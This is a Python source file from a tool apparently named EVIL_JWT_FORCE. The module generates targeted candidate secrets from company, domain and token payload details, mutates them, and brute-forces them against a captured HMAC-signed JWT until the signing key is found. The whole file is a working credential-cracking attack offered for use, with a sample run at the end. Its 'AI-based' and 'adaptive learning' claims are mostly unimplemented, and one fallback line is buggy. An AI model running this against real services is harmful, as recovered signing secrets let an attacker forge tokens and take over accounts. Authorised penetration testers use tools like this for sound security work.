"""
EVIL_JWT_FORCE - JWT Predictor Module
This module uses AI-based approaches to predict JWT secrets based on patterns, 
wordlists, and target information.
"""

import os
import sys
import json
import logging
import re
import random
import hashlib
import string
import numpy as np
from typing import Dict, List, Any, Optional, Tuple, Set, Union
from datetime import datetime
import itertools
from collections import Counter, defaultdict

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler(os.path.join('logs', 'jwt_predictor.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('JWT_PREDICTOR')

class JWTPredictor:
    """
    Predicts possible JWT secrets using AI-based analysis of patterns and wordlists.
    
    This class implements various strategies to generate and prioritize potential
    JWT secrets, based on target information and common patterns.
    """
    
    def __init__(self, config_path: str = 'config/jwt_predictor_config.json'):
        """
        Initialize the JWT Predictor with configuration settings.
        
        Args:
            config_path: Path to the predictor configuration file
        """
        self.config = self._load_config(config_path)
        self.common_patterns = self.config.get('common_patterns', [])
        self.company_patterns = self.config.get('company_patterns', [])
        self.max_predictions = self.config.get('max_predictions', 1000)
        self.token_insights = {}
        self.target_info = {}
        self.historical_data = self._load_historical_data()
        self.pattern_weights = self.config.get('pattern_weights', {})
        self.semantic_clusters = self._load_semantic_clusters()
        self.success_history = []
        self.learning_rate = self.config.get('learning_rate', 0.1)
        self.token_embeddings = {}
        self.domain_knowledge = self._load_domain_knowledge()
        
        logger.info("JWT Predictor initialized with %d common patterns and %d semantic clusters", 
                   len(self.common_patterns), len(self.semantic_clusters))
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from JSON file or use defaults if file not found."""
        default_config = {
            'common_patterns': [
                "secret",
                "jwt_secret",
                "jwt-secret",
                "jwtSecret",
                "jwt_key",
                "api_secret",
                "apiSecret",
                "app_secret",
                "appSecret",
                "token_secret",
                "tokenSecret",
                "auth_secret",
                "authSecret",
                "signature",
                "key",
                "private_key",
                "privateKey",
                "secret_key",
                "secretKey",
                "password",
                "pass",
                "pwd",
                "p@ssw0rd",
                "admin",
                "root",
                "12345",
                "123456",
                "qwerty",
                "letmein",
                "welcome",
                "changeme"
            ],
            'company_patterns': [
                "{company}",
                "{company}_secret",
                "{company}secret",
                "{company}_jwt",
                "{company}jwt",
                "{company}_key",
                "{company}key",
                "{company}_token",
                "{company}token",
                "{company}_auth",
                "{company}auth",
                "{company}_{year}",
                "{company}{year}",
                "{company}_api",
                "{company}api",
                "{company}_app",
                "{company}app"
            ],
            'transform_functions': [
                "lowercase",
                "uppercase",
                "capitalize",
                "reverse",
                "leetspeak",
                "append_year",
                "prepend_year",
                "append_common_number",
                "append_special_char",
                "camel_case",
                "snake_case",
                "kebab_case",
                "double_words",
                "mirror_words",
                "prefix_suffix_combination"
            ],
            'pattern_weights': {
                "company_name": 1.5,
                "domain_name": 1.3,
                "product_name": 1.2,
                "common_secret": 1.0,
                "year_based": 0.8,
                "random_pattern": 0.5
            },
            'semantic_analysis': {
                "enabled": True,
                "min_similarity": 0.7,
                "context_aware": True
            },
            'adaptive_learning': {
                "enabled": True,
                "history_weight": 0.8,
                "success_boost": 1.5,
                "failure_penalty": 0.7
            },
            'max_predictions': 1000,
            'min_secret_length': 4,
            'max_secret_length': 64,
            'leet_speak_map': {
                'a': '4', 'e': '3', 'i': '1', 'o': '0', 't': '7', 's': '5', 'g': '9',
                'b': '8', 'z': '2', 'l': '1'
            },
            'common_years': [
                "2020", "2021", "2022", "2023", "2024", "2025",
                "20", "21", "22", "23", "24", "25"
            ],
            'common_numbers': [
                "1", "2", "3", "123", "1234", "12345", "123456", "321", "0", "00",
                "111", "222", "333", "555", "666", "777", "888", "999"
            ],
            'special_chars': [
                "!", "@", "#", "$", "%", "^", "&", "*", "_", "-", ".", "+", "?",
                "=", "/", "\\", "|", "~", "<", ">"
            ],
            'learning_rate': 0.1,
            'context_awareness': True,
            'token_analysis_depth': 'deep'
        }
        
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
            else:
                logger.warning("Config file not found at %s. Using default configuration.", config_path)
                # Create default config
                os.makedirs(os.path.dirname(config_path), exist_ok=True)
                with open(config_path, 'w') as f:
                    json.dump(default_config, f, indent=2)
                return default_config
        except Exception as e:
            logger.error("Error loading configuration: %s. Using default configuration.", str(e))
            return default_config
    
    def _load_historical_data(self) -> Dict[str, Any]:
        """Load historical prediction data to improve future predictions."""
        history_file = os.path.join('data', 'jwt_predictor_history.json')
        
        try:
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    return json.load(f)
            else:
                logger.info("No historical data found. Initializing new dataset.")
                history_data = {
                    'successful_patterns': {},
                    'token_insights': {},
                    'domain_correlations': {},
                    'pattern_success_rates': {},
                    'last_updated': datetime.now().isoformat()
                }
                os.makedirs(os.path.dirname(history_file), exist_ok=True)
                with open(history_file, 'w') as f:
                    json.dump(history_data, f, indent=2)
                return history_data
        except Exception as e:
            logger.error("Error loading historical data: %s", str(e))
            return {
                'successful_patterns': {},
                'token_insights': {},
                'domain_correlations': {},
                'pattern_success_rates': {}
            }
    
    def _load_semantic_clusters(self) -> Dict[str, List[str]]:
        """Load semantic clusters for improved word associations."""
        clusters_file = os.path.join('data', 'semantic_clusters.json')
        
        default_clusters = {
            'authentication': [
                'auth', 'login', 'access', 'token', 'credential', 'session',
                'identity', 'account', 'user', 'password', 'secret'
            ],
            'security': [
                'secure', 'protect', 'encrypt', 'hash', 'sign', 'verify',
                'validate', 'check', 'guard', 'shield', 'firewall'
            ],
            'web': [
                'web', 'http', 'https', 'site', 'portal', 'app', 'application',
                'api', 'service', 'endpoint', 'resource', 'rest'
            ],
            'company': [
                'corp', 'inc', 'company', 'enterprise', 'organization', 'business',
                'firm', 'group', 'agency', 'association', 'partner'
            ],
            'infrastructure': [
                'server', 'cloud', 'aws', 'azure', 'gcp', 'host', 'container',
                'docker', 'kubernetes', 'cluster', 'node', 'instance'
            ]
        }
        
        try:
            if os.path.exists(clusters_file):
                with open(clusters_file, 'r') as f:
                    return json.load(f)
            else:
                logger.info("No semantic clusters found. Using default clusters.")
                os.makedirs(os.path.dirname(clusters_file), exist_ok=True)
                with open(clusters_file, 'w') as f:
                    json.dump(default_clusters, f, indent=2)
                return default_clusters
        except Exception as e:
            logger.error("Error loading semantic clusters: %s", str(e))
            return default_clusters
    
    def _load_domain_knowledge(self) -> Dict[str, Any]:
        """Load domain-specific knowledge for improved predictions."""
        knowledge_file = os.path.join('data', 'domain_knowledge.json')
        
        default_knowledge = {
            'industries': {
                'finance': ['bank', 'money', 'credit', 'debit', 'payment', 'transaction', 'account'],
                'healthcare': ['health', 'medical', 'patient', 'doctor', 'hospital', 'clinic'],
                'ecommerce': ['shop', 'store', 'cart', 'order', 'product', 'item', 'purchase'],
                'technology': ['tech', 'software', 'hardware', 'code', 'program', 'system', 'data']
            },
            'common_prefixes': ['api', 'app', 'web', 'dev', 'prod', 'test', 'stage', 'uat', 'secure'],
            'common_suffixes': ['key', 'token', 'secret', 'auth', 'pass', 'pwd', 'cred'],
            'frameworks': {
                'jwt': ['jwt', 'token', 'bearer', 'auth0', 'oauth', 'oidc'],
                'spring': ['spring', 'boot', 'security', 'java'],
                'node': ['node', 'express', 'passport', 'npm'],
                'dotnet': ['aspnet', 'core', 'identity', 'microsoft']
            }
        }
        
        try:
            if os.path.exists(knowledge_file):
                with open(knowledge_file, 'r') as f:
                    return json.load(f)
            else:
                logger.info("No domain knowledge found. Using default knowledge base.")
                os.makedirs(os.path.dirname(knowledge_file), exist_ok=True)
                with open(knowledge_file, 'w') as f:
                    json.dump(default_knowledge, f, indent=2)
                return default_knowledge
        except Exception as e:
            logger.error("Error loading domain knowledge: %s", str(e))
            return default_knowledge
    
    def set_target_info(self, target_info: Dict[str, Any]) -> None:
        """
        Set target information for more targeted predictions.
        
        Args:
            target_info: Dictionary containing information about the target
        """
        self.target_info = target_info
        
        # Extract and normalize additional information
        if 'company' in target_info and target_info['company']:
            self.target_info['company_normalized'] = self._normalize_name(target_info['company'])
            
        if 'domain' in target_info and target_info['domain']:
            self.target_info['domain_parts'] = self._extract_domain_parts(target_info['domain'])
            
        if 'product' in target_info and target_info['product']:
            self.target_info['product_normalized'] = self._normalize_name(target_info['product'])
        
        logger.info("Target information set for prediction with %d attributes", len(target_info))
    
    def _normalize_name(self, name: str) -> str:
        """Normalize a name by removing special characters and converting to lowercase."""
        if not name:
            return ""
        return re.sub(r'[^a-z0-9]', '', name.lower())
    
    def _extract_domain_parts(self, domain: str) -> List[str]:
        """Extract meaningful parts from a domain name."""
        if not domain:
            return []
            
        # Remove TLD and split by dots and dashes
        domain_clean = re.sub(r'\.(com|org|net|io|gov|edu|co|uk|us|eu|de|fr|jp|cn|br|ru|in|au|ca)$', '', domain.lower())
        parts = re.split(r'[.-]', domain_clean)
        
        # Filter out common subdomains
        filtered_parts = [p for p in parts if p not in ['www', 'api', 'dev', 'test', 'stage', 'prod', 'app']]
        
        return filtered_parts
    
    def analyze_token(self, token: str) -> Dict[str, Any]:
        """
        Analyze a JWT token to extract insights that might help predict its secret.
        
        Args:
            token: The JWT token to analyze
            
        Returns:
            Dictionary with token analysis
        """
        try:
            # Basic validation of JWT format
            parts = token.split('.')
            if len(parts) != 3:
                logger.warning("Invalid JWT format: %s", token[:20])
                return {'valid': False, 'error': 'Invalid JWT format'}
            
            # Decode header and payload
            try:
                import base64
                
                # Add padding if needed
                def add_padding(data):
                    missing_padding = len(data) % 4
                    if missing_padding:
                        data += '=' * (4 - missing_padding)
                    return data
                
                header_json = base64.urlsafe_b64decode(add_padding(parts[0])).decode('utf-8')
                payload_json = base64.urlsafe_b64decode(add_padding(parts[1])).decode('utf-8')
                
                header = json.loads(header_json)
                payload = json.loads(payload_json)
            except Exception as e:
                logger.warning("Error decoding JWT parts: %s", str(e))
                return {'valid': False, 'error': f'Error decoding JWT: {str(e)}'}
            
            # Extract key information
            algorithm = header.get('alg', 'unknown')
            
            # Only certain algorithms use secrets that can be predicted
            if algorithm not in ['HS256', 'HS384', 'HS512']:
                logger.info("Token uses algorithm %s which may not use a predictable secret", algorithm)
            
            # Extract payload fields that might be related to the secret
            interesting_fields = [
                'iss', 'sub', 'aud', 'client_id', 'azp', 'app', 'application',
                'tenant', 'organization', 'org', 'company', 'service', 'project',
                'name', 'username', 'email', 'domain', 'scope', 'role', 'group'
            ]
            
            extracted_values = {}
            for field in interesting_fields:
                if field in payload:
                    extracted_values[field] = payload[field]
            
            # Perform deep analysis if configured
            deep_analysis = {}
            if self.config.get('token_analysis_depth') == 'deep':
                deep_analysis = self._perform_deep_analysis(header, payload, parts[2])
            
            # Generate token fingerprint
            token_fingerprint = self._generate_token_fingerprint(header, payload)
            
            # Store insights for this token
            token_key = token[:20]  # Use first 20 chars as key
            self.token_insights[token_key] = {
                'algorithm': algorithm,
                'extracted_values': extracted_values,
                'header': header,
                'header_fields': list(header.keys()),
                'payload_fields': list(payload.keys()),
                'signature_length': len(parts[2]),
                'fingerprint': token_fingerprint,
                'timestamp': datetime.now().isoformat(),
                'deep_analysis': deep_analysis
            }
            
            # Update token embedding
            self._update_token_embedding(token_fingerprint, header, payload)
            
            return {
                'valid': True,
                'algorithm': algorithm,
                'extracted_values': extracted_values,
                'token_key': token_key,
                'fingerprint': token_fingerprint,
                'deep_analysis': deep_analysis
            }
            
        except Exception as e:
            logger.error("Error analyzing token: %s", str(e))
            return {'valid': False, 'error': str(e)}
    
    def _generate_token_fingerprint(self, header: Dict[str, Any], payload: Dict[str, Any]) -> str:
        """Generate a unique fingerprint for a token based on its structure."""
        try:
            header_keys = sorted(list(header.keys()))
            payload_keys = sorted(list(payload.keys()))
            alg = header.get('alg', 'unknown')
            
            fingerprint_base = f"{alg}:{','.join(header_keys)}:{','.join(payload_keys)}"
            return hashlib.sha256(fingerprint_base.encode()).hexdigest()[:16]
        except Exception as e:
            logger.error(f"Error generating token fingerprint: {str(e)}")
            return hashlib.sha256(str(header) + str(payload).encode()).hexdigest()[:16]
    
    def _perform_deep_analysis(self, header: Dict[str, Any], payload: Dict[str, Any], signature: str) -> Dict[str, Any]:
        """Perform deep analysis on token parts to extract additional insights."""
        analysis = {}
        
        # Analyze issuer domain if present
        if 'iss' in payload and isinstance(payload['iss'], str):
            issuer = payload['iss']
            domain_match = re.search(r'https?://([^/]+)', issuer)
            if domain_match:
                domain = domain_match.group(1)
                analysis['issuer_domain'] = domain
                analysis['domain_parts'] = self._extract_domain_parts(domain)
        
        # Identify potential naming patterns
        name_patterns = []
        for key, value in payload.items():
            if isinstance(value, str):
                # Look for company or product names
                for pattern_type in ['company', 'product', 'app', 'service']:
                    if pattern_type in key.lower() and len(value) > 3:
                        name_patterns.append(value)
                
                # Look for domains
                if 'domain' in key.lower() or 'url' in key.lower() or 'site' in key.lower():
                    name_patterns.append(value)
        
        if name_patterns:
            analysis['potential_name_patterns'] = name_patterns
        
        # Analyze signature length and characteristics
        analysis['signature_entropy'] = self._calculate_entropy(signature)
        
        # Identify potential frameworks
        framework_indicators = {
            'auth0': ['auth0', 'https://auth0.com/', 'client_id', 'https://claims'],
            'cognito': ['cognito', 'aws', 'amazon', 'token_use'],
            'keycloak': ['keycloak', 'realm_access', 'resource_access'],
            'firebase': ['firebase', 'sign_in_provider', 'uid'],
            'okta': ['okta', 'https://okta.com'],
            'azure_ad': ['azure', 'microsoft', 'azp', 'scp', 'tid']
        }
        
        for framework, indicators in framework_indicators.items():
            if any(indicator in str(payload).lower() for indicator in indicators):
                analysis['potential_framework'] = framework
                break
        
        return analysis
    
    def _calculate_entropy(self, data: str) -> float:
        """Calculate Shannon entropy of a string."""
        if not data:
            return 0.0
            
        entropy = 0.0
        for x in Counter(data).values():
            p_x = float(x) / len(data)
            entropy -= p_x * np.log2(p_x)
        return entropy
    
    def _update_token_embedding(self, token_fingerprint: str, header: Dict[str, Any], payload: Dict[str, Any]) -> None:
        """Generate and store a simple semantic embedding for a token."""
        try:
            # Create a simple embedding based on token characteristics
            # In a production environment, this would use proper NLP embeddings
            
            # Extract key features
            features = [
                header.get('alg', 'unknown'),
                header.get('typ', 'unknown'),
                'kid' if 'kid' in header else 'no_kid',
                'jku' if 'jku' in header else 'no_jku',
                'exp' if 'exp' in payload else 'no_exp',
                'iat' if 'iat' in payload else 'no_iat',
                'iss' if 'iss' in payload else 'no_iss',
                'sub' if 'sub' in payload else 'no_sub',
                'aud' if 'aud' in payload else 'no_aud',
            ]
            
            # Add payload fields (limited to avoid too large vectors)
            for key in list(payload.keys())[:5]:
                features.append(f"has_{key}")
                
            # Create a simple binary embedding
            all_features = self._get_all_possible_features()
            embedding = np.zeros(len(all_features))
            
            for i, feature in enumerate(all_features):
                if feature in features:
                    embedding[i] = 1.0
            
            # Store the embedding
            self.token_embeddings[token_fingerprint] = embedding.tolist()
            
        except Exception as e:
            logger.error(f"Error updating token embedding: {str(e)}")
    
    def _get_all_possible_features(self) -> List[str]:
        """Get all possible token features for embedding generation."""
        # This would ideally be dynamically built from observed tokens
        return [
            'HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'none', 'unknown',
            'JWT', 'unknown', 'kid', 'no_kid', 'jku', 'no_jku', 'x5u', 'no_x5u',
            'exp', 'no_exp', 'iat', 'no_iat', 'nbf', 'no_nbf', 'iss', 'no_iss', 'sub', 'no_sub',
            'aud', 'no_aud', 'has_admin', 'has_role', 'has_user', 'has_name', 'has_email',
            'has_permissions', 'has_scope', 'has_groups', 'has_id', 'has_jti'
        ]
    
    def generate_wordlist(self, token: Optional[str] = None, max_words: int = 1000) -> List[str]:
        """
        Generate a targeted wordlist for JWT secret prediction.
        
        Args:
            token: Optional JWT token to analyze for targeted predictions
            max_words: Maximum number of words to generate
            
        Returns:
            List of potential JWT secrets
        """
        words: Set[str] = set()
        token_key = None
        
        # If token provided, analyze it first
        if token:
            analysis = self.analyze_token(token)
            if analysis.get('valid'):
                token_key = analysis.get('token_key')
        
        # Add common patterns
        words.update(self.common_patterns)
        
        # Add company-specific patterns if target info available
        if 'company' in self.target_info:
            company = self.target_info['company']
            years = self.config.get('common_years', [])
            
            for pattern in self.company_patterns:
                for year in years + [""]:
                    word = pattern.replace("{company}", company).replace("{year}", year)
                    words.add(word)
        
        # Add values from token analysis
        if token_key and token_key in self.token_insights:
            insights = self.token_insights[token_key]
            
            for field, value in insights.get('extracted_values', {}).items():
                if isinstance(value, str):
                    words.add(value)
                    
                    # Add variations
                    words.add(value.lower())
                    words.add(value.upper())
                    words.add(f"{value}_secret")
                    words.add(f"{value}secret")
                    words.add(f"{value}_key")
                    words.add(f"{value}key")
        
        # Add values from target info
        for key, value in self.target_info.items():
            if isinstance(value, str):
                words.add(value)
                words.add(value.lower())
                words.add(value.upper())
        
        # Apply transformations to generate variations
        transformed_words = self._apply_transformations(words)
        words.update(transformed_words)
        
        # Filter by length
        min_length = self.config.get('min_secret_length', 4)
        max_length = self.config.get('max_secret_length', 64)
        words = {w for w in words if min_length <= len(w) <= max_length}
        
        # Convert to list and limit to max_words
        word_list = list(words)
        if len(word_list) > max_words:
            word_list = word_list[:max_words]
        
        logger.info("Generated wordlist with %d entries", len(word_list))
        return word_list
    
    def _apply_transformations(self, words: Set[str]) -> Set[str]:
        """Apply transformations to generate variations of words."""
        transformed: Set[str] = set()
        
        # Get available transform functions
        transform_functions = self.config.get('transform_functions', [])
        leet_speak_map = self.config.get('leet_speak_map', {})
        common_years = self.config.get('common_years', [])
        common_numbers = self.config.get('common_numbers', [])
        special_chars = self.config.get('special_chars', [])
        
        for word in words:
            # Apply each selected transformation
            if "lowercase" in transform_functions:
                transformed.add(word.lower())
            
            if "uppercase" in transform_functions:
                transformed.add(word.upper())
            
            if "capitalize" in transform_functions:
                transformed.add(word.capitalize())
            
            if "reverse" in transform_functions:
                transformed.add(word[::-1])
            
            if "leetspeak" in transform_functions:
                leet_word = word
                for char, leet_char in leet_speak_map.items():
                    leet_word = leet_word.replace(char, leet_char)
                transformed.add(leet_word)
            
            if "append_year" in transform_functions:
                for year in common_years:
                    transformed.add(f"{word}{year}")
            
            if "prepend_year" in transform_functions:
                for year in common_years:
                    transformed.add(f"{year}{word}")
            
            if "append_common_number" in transform_functions:
                for num in common_numbers:
                    transformed.add(f"{word}{num}")
            
            if "append_special_char" in transform_functions:
                for char in special_chars:
                    transformed.add(f"{word}{char}")
        
        return transformed
    
    def predict_secrets(self, token: str, limit: int = 100) -> List[str]:
        """
        Predict potential secrets for a JWT token.
        
        Args:
            token: The JWT token to predict secrets for
            limit: Maximum number of predictions to return
            
        Returns:
            List of predicted secrets
        """
        # Analyze the token
        analysis = self.analyze_token(token)
        if not analysis['valid']:
            logger.warning("Cannot predict secrets for invalid token")
            return []
        
        # Generate wordlist
        wordlist = self.generate_wordlist(token, max_words=self.max_predictions)
        
        # Prioritize the wordlist based on the token analysis
        prioritized_wordlist = self._prioritize_wordlist(wordlist, analysis)
        
        # Return top predictions
        return prioritized_wordlist[:limit]
    
    def _prioritize_wordlist(self, wordlist: List[str], analysis: Dict[str, Any]) -> List[str]:
        """
        Prioritize the wordlist based on token analysis.
        
        Args:
            wordlist: The wordlist to prioritize
            analysis: The token analysis results
            
        Returns:
            Prioritized wordlist
        """
        # Calculate score for each word
        word_scores = []
        
        token_key = analysis.get('token_key')
        extracted_values = analysis.get('extracted_values', {})
        
        for word in wordlist:
            score = 0
            
            # Base score - longer words get slightly lower score
            base_score = 10 - min(len(word) / 10, 5)
            score += base_score
            
            # Check if word is related to extracted values from token
            for field, value in extracted_values.items():
                if isinstance(value, str):
                    # Direct match with extracted value
                    if word.lower() == value.lower():
                        score += 20
                    # Contains extracted value
                    elif value.lower() in word.lower():
                        score += 10
                    # Is contained in extracted value
                    elif word.lower() in value.lower():
                        score += 5
            
            # Check if word is related to target info
            for field, value in self.target_info.items():
                if isinstance(value, str):
                    # Direct match with target info
                    if word.lower() == value.lower():
                        score += 15
                    # Contains target info
                    elif value.lower() in word.lower():
                        score += 8
                    # Is contained in target info
                    elif word.lower() in value.lower():
                        score += 4
            
            # Add common patterns bonus
            if word in self.common_patterns:
                score += 10
            
            # Algorithm-specific patterns
            if token_key in self.token_insights:
                algorithm = self.token_insights[token_key].get('algorithm')
                if algorithm == 'HS256':
                    if 'hs256' in word.lower() or '256' in word:
                        score += 5
                elif algorithm == 'HS384':
                    if 'hs384' in word.lower() or '384' in word:
                        score += 5
                elif algorithm == 'HS512':
                    if 'hs512' in word.lower() or '512' in word:
                        score += 5
            
            # Add some randomness to break ties
            score += random.uniform(0, 1)
            
            word_scores.append((word, score))
        
        # Sort by score (descending)
        word_scores.sort(key=lambda x: x[1], reverse=True)
        
        # Return just the words
        return [word for word, score in word_scores]
    
    def save_wordlist(self, wordlist: List[str], filename: str) -> bool:
        """
        Save the generated wordlist to a file.
        
        Args:
            wordlist: The wordlist to save
            filename: The filename to save to
            
        Returns:
            True if successful, False otherwise
        """
        try:
            directory = os.path.dirname(filename)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
                
            with open(filename, 'w') as f:
                for word in wordlist:
                    f.write(f"{word}\n")
            
            logger.info("Saved wordlist with %d entries to %s", len(wordlist), filename)
            return True
        except Exception as e:
            logger.error("Error saving wordlist to %s: %s", filename, str(e))
            return False
    
    def predict_and_verify(self, token: str, limit: int = 100, 
                          callback: Optional[callable] = None) -> Dict[str, Any]:
        """
        Predict secrets and verify them against the token.
        
        Args:
            token: The JWT token to predict and verify secrets for
            limit: Maximum number of predictions to try
            callback: Optional callback function to report progress
            
        Returns:
            Dictionary with verification results
        """
        # Generate predictions
        predictions = self.predict_secrets(token, limit=limit)
        
        # Verify each prediction
        results = {
            'token': token,
            'total_predictions': len(predictions),
            'verified': 0,
            'success': False,
            'secret': None,
            'attempts': []
        }
        
        try:
            import jwt
            
            for i, secret in enumerate(predictions):
                try:
                    # Try to verify the token with this secret
                    decoded = jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    
                    # If we get here, verification succeeded
                    results['success'] = True
                    results['secret'] = secret
                    results['decoded'] = decoded
                    results['attempts'].append({
                        'secret': secret,
                        'index': i,
                        'success': True
                    })
                    results['verified'] = i + 1
                    
                    logger.info("Successfully verified token with secret: %s (attempt %d/%d)", 
                               secret, i + 1, len(predictions))
                    
                    # Report progress if callback provided
                    if callback:
                        callback(i + 1, len(predictions), True, secret)
                    
                    break
                    
                except jwt.InvalidTokenError:
                    # This secret didn't work
                    results['attempts'].append({
                        'secret': secret,
                        'index': i,
                        'success': False
                    })
                    
                    # Report progress if callback provided
                    if callback:
                        callback(i + 1, len(predictions), False, secret)
                    
                    # Log every 100 attempts
                    if (i + 1) % 100 == 0:
                        logger.info("Verified %d/%d predictions without success", 
                                   i + 1, len(predictions))
        
        except ImportError:
            logger.error("PyJWT library not available, cannot verify predictions")
            results['error'] = "PyJWT library not available"
        
        # Update final verification count
        results['verified'] = len(results['attempts'])
        
        return results


if __name__ == "__main__":
    # Example usage
    predictor = JWTPredictor()
    
    # Set some target info
    predictor.set_target_info({
        'company': 'acme',
        'domain': 'acme.com',
        'product': 'rocket',
        'api_version': 'v1'
    })
    
    # Example token (HS256 with secret 'secret')
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    # Generate wordlist
    wordlist = predictor.generate_wordlist(token, max_words=100)
    print(f"Generated {len(wordlist)} potential secrets")
    
    # Predict and verify
    def progress_callback(current, total, success, secret):
        if success:
            print(f"✓ Found secret: {secret} (attempt {current}/{total})")
        elif current % 10 == 0:
            print(f"× Checked {current}/{total} secrets...")
    
    results = predictor.predict_and_verify(token, limit=100, callback=progress_callback)
    
    if results['success']:
        print(f"\nSuccess! Found secret: {results['secret']}")
        print(f"Decoded payload: {json.dumps(results['decoded'], indent=2)}")
    else:
        print("\nFailed to find the secret")
    
    print(f"Verified {results['verified']}/{results['total_predictions']} predictions") 